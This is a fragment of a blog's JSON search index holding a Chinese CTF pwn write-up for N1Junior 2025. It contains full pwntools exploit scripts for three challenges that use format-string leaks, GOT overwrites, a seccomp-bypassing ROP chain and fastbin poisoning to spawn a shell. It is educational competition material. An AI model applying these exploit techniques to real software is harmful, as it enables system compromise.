#----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) #----------------------------------------------------------------- pl = b'%8c%30$hhn%9$p' # dbg() sl(pl) ru(b\"0x\") pie = int(r(16),16) - 0x1279 success(\"pie = 0x%x\",pie) pl = b\"%12$p%26$p\" #stack libc # dbg() sl(pl) # ru(b\"0x\") ru(b\"0x\") stack = int(r(12),16) - 0x40 ru(b\"0x\") libc_addr = int(r(12),16) - 0x216600 success(\"stack=0x%x\",stack) success(\"libc_base=0x%x\",libc_addr) stack_ret_addr = stack + 8 pop_rdi_ret = libc_addr + 0x2a3e5 binsh_addr = libc_addr + next(libc.search(b\"/bin/sh\")) system_addr = libc_addr + libc.sym[\"system\"] one = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43] one_addr = libc_addr + one[4] payload2 = fmtstr_payload(6,{stack_ret_addr:one_addr}) # dbg() s(payload2) itr() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:1:0","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#remake"},{"categories":["WP"],"content":"\rwrite_at_will Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:0","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#write_at_will"},{"categories":["WP"],"content":"\r逆向分析程序开了沙箱 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000003 if (A != close) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL 只允许了exit、read、write、openat、close 要通过 openat、read、write读出flag，这里注意要在当前目录下创建一个flag ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:1","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#逆向分析"},{"categories":["WP"],"content":"\r思路 程序中没留后门函数，需要libc，先泄露libc 改printf_got为gets，改exit_got为0x40165a，改__stack_chk_fail为ret。这样相当于做ROP 写openat+read+write的ROP链 在call __stack_chk_fail的时候会push下一条指令的地址 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) exit_got = elf.got['exit'] def arb_write(address,content): p.sendlineafter(b'. Exit\\n',b'1') p.sendafter(b'get?',str(address).encode()) p.send(p32(content)) #泄露libc p.sendlineafter(b'3. Exit\\n',b'2') p.sendafter(b'get?',str(0x404038).encode()) p.recvuntil(b'\\x0a') libc_base = u64(p.recv(6)[-7:].ljust(8,b'\\x00')) - 0x7330237b97d0 + 0x7330236a5000 success(\"libc ---\u003e 0x%x\",libc) gets_addr = libc_base + libc.symbols['gets'] #改printf为gets arb_write(0x404030,gets_addr\u00260xffffffff) #改exit_got arb_write(exit_got,0x40165a) #改stack chk fail 为 ret指令 arb_write(0x404028,0x40101a) openat = libc_base + libc.symbols['openat'] read = libc_base + libc.symbols['read'] write = libc_base + libc.symbols['write'] exit_addr = libc_base + libc.symbols['exit'] pop_rdi_ret = libc_base + 0x000000000002a3e5 pop_rsi_ret = libc_base + 0x000000000002be51 pop_rdx_rcx_rbx_ret = libc_base + 0x0000000000108b03 ret = 0x40101a pl = b'a'*0xa + p64(ret)*8 pl += p64(pop_rdi_ret) + p64(0x404200) + p64(gets_addr) pl += p64(pop_rdi_ret) + p64(0xffffff9c) + p64(pop_rsi_ret) + p64(0x404200) +p64(pop_rdx_rcx_rbx_ret) + p64(0)*3 + p64(openat) pl += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x404300) + p64(pop_rdx_rcx_rbx_ret) + p64(0x100)*3 + p64(read) pl += p64(pop_rdi_ret) + p64(1) + p64(write) # dbg() p.sendline(pl) p.sendline(b'/flag\\x00') p.interactive() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:2","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#思路"},{"categories":["WP"],"content":"\roldwine","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:0","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#oldwine"},{"categories":["WP"],"content":"\r逆向分析菜单题 add： 根据读入的data_size申请堆块，chunk限制小于等于0x60 并把读入的account、password、堆块地址八字节一写，写0x18一组进0x602040 最后把password根据password的第一个字节对其进行异或加密，还把存储的堆地址的最后一个字节给加密了 delete： free掉堆块，把account、password、堆块地址置0 show： 输入idx，验证password，通过就打印account和data data这里用的是%s，没有\\x00就会一直输出 需要知道的几个点： 把密码的最后一个字节设置成\\x00，就能绕过加密 我们free掉的是加密后的堆地址，可以通过控制加密后的地址，实现邻近地址的任意free（这也是这道题的核心利用点） 我的思路： 泄露libc： 通过libc中的__environ泄露栈地址： 到栈上做ROP： 首先这么构造堆块 data = p64(0)+p64(0x91) add(p64(0x123),p8(0x50),0x10,data) #0 data = p64(0) + p64(0xa1) add(p64(0x123),p64(0),0x50,data) #1 data = b'aaaa' add(p64(0x123),p64(0),0x40,data) #2 add(p64(0x123),p64(0),0x10,data) #3 可以看到经过异或加密，delete(0)的时候，实际上是去delete那个伪造的unsorted bin 接下来，再去把哪个Unsorted bin中的堆块申请出来的时候，其中的libc地址还在那里，泄露出来就行 delete(0,p8(0x50)) #0被free data = b'p'*8 add(p64(0x123),p64(0),0x20,data) #0 show(0,p64(0)) p.recvuntil(b'p'*8) libc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3c4c08 success(\"libc_base -\u003e 0x%x\",libc_base) environ = libc_base + libc.symbols['__environ'] environ_lastbyte = environ \u0026 0xff success(\"environ -\u003e 0x%x\",environ) 接下来，通过伪造fastbin的fd，把堆块申请到bss上 delete(2,p64(0)) #进入fastbin #2被free #覆盖fastbin中堆块的fd pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查 add(p64(0x123),p64(0),0x50,pl) #2 这部分delete(2)之后的堆结构： 然后申请的是0x60的chunk，fastbin没有满足的，unsortedbin中有一个满足，又因为0x70-0x60 \u003c 0x20，如果切割剩下的堆块小于0x20，所以整个都给分配出来，再往fastbin的fd写入bss地址 接着往bss上写入environ去泄露栈地址： add(p64(0x50),p64(0),0x40,data) #4 #泄露栈地址 data = p64(0) + p64(environ) add(p64(0x123),p64(0),0x40,data) #5，0x6020a8 show(4,p64(0)) p.recvuntil(b'[data]: ') stack_addr = u64(p.recv(6).ljust(8,b'\\x00')) success(\"stack_addr -\u003e 0x%x\",stack_addr) 做ROP的环节还是覆盖fastbin的fd，讲一下比较关键的部分： 我们可以执行下面的命令来看看申请fastbin到哪里，怎么申请： 有两个地址可以供我们使用，但是有一个是需要0x70的fastbin，我们最大只能申请0x60的chunk，所以用第二个。把堆申请到这里，再去system(\"/bin/sh\")就可以了 ","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:1","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#逆向分析-1"},{"categories":["WP"],"content":"\rexp 其实感觉还有更简单的方法 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc ip = \"host.docker.internal\" port = 5555 # p = remote(ip,port) def cmd(idx): p.recvuntil(b'\u003e\u003e ') p.sendline(str(idx).encode()) def add(account,password,size,data): cmd(1) p.sendafter(b'[account]: ',account) p.sendafter(b'[password]: ',password) p.sendafter(b'[data size]: ',str(size)) p.sendafter(b'[data]: ',data) def delete(idx,password): cmd(2) p.sendafter(b'[idx]: ',str(idx).encode()) p.sendafter(b'[verify]: ',password) def show(idx,password): cmd(3) p.sendafter(b'[idx]: ',str(idx).encode()) p.sendafter(b'[verify]: ',password) #泄露libc data = p64(0)+p64(0x91) add(p64(0x123),p8(0x50),0x10,data) #0 data = p64(0) + p64(0xa1) add(p64(0x123),p64(0),0x50,data) #1 data = b'aaaa' add(p64(0x123),p64(0),0x40,data) #2 add(p64(0x123),p64(0),0x10,data) #3 delete(0,p8(0x50)) #0被free data = b'p'*8 add(p64(0x123),p64(0),0x20,data) #0 show(0,p64(0)) p.recvuntil(b'p'*8) libc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3c4c08 success(\"libc_base -\u003e 0x%x\",libc_base) environ = libc_base + libc.symbols['__environ'] environ_lastbyte = environ \u0026 0xff success(\"environ -\u003e 0x%x\",environ) delete(2,p64(0)) #进入fastbin #2被free #覆盖fastbin中堆块的fd pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查 add(p64(0x123),p64(0),0x50,pl) #2 add(p64(0x50),p64(0),0x40,data) #4 #泄露栈地址 data = p64(0) + p64(environ) add(p64(0x123),p64(0),0x40,data) #5，0x6020a8 show(4,p64(0)) p.recvuntil(b'[data]: ') stack_addr = u64(p.recv(6).ljust(8,b'\\x00')) success(\"stack_addr -\u003e 0x%x\",stack_addr) #ROP data = b'aaaa' add(p64(0x123),p64(0x30),0x10,data) #6 pl = p64(0) + p64(0x61) + p64(0) + p64(0x61) add(p64(0x123),p64(0),0x50,pl)#7 #下面这两个堆块用于防止consolidate和对invalid next size (fast)的检测 data = p64(0) + p64(0x51) add(p64(0x123),p64(0),0x10,data)#8 data = p64(0)*2 + p64(0) + p64(0x31) add(p64(0x123),p64(0xe0),0x20,data)#9 delete(9,p64(0xe0)) #可以控制堆块 delete(6,p64(0x30)) #改堆块8的size为0x41,做ROP pl = p64(0) + p64(0x61) + p64(0)*7 + p64(0x41) add(p64(0x123),p64(0),0x50,pl) #6 #接下来free掉堆块8,其size为0x41,进入fast bin add(p64(0x123),p64(0),0x10,data) #9 add(p64(0x123),p64(0),0x10,data) #10 delete(8,p64(0)) #改堆块8的fd为栈地址,让其size为0x40 fake_fast_addr = stack_addr - 0x136 rbp = stack_addr + 0xf8 pl = p64(0)*7 + p64(0x41) + p64(fake_fast_addr) success(\"fake_fast_addr -\u003e 0x%x\",fake_fast_addr) add(p64(0x123),p64(0),0x50,pl)#8 add(p64(0x123),p64(0),0x30,data) #11 system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + next(libc.search(\"/bin/sh\")) pop_rdi_ret = 0x0000000000400df3 pl = b'\\x00'*6 + p64(0) + p64(rbp) pl+=p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) add(p64(0x123),p64(0),0x30,pl) # dbg() p.interactive() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:2","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#exp"},{"categories":null,"content":"QQ：Mjg0MDU1MjIxNQ== Email：U2hsb21vSnVuZUBvdXRsb29rLmNvbQ== ","date":"0001-01-01","objectID":"/about/:0:0","series":null,"tags":null,"title":"ABOUT MEEE","uri":"/about/#"}]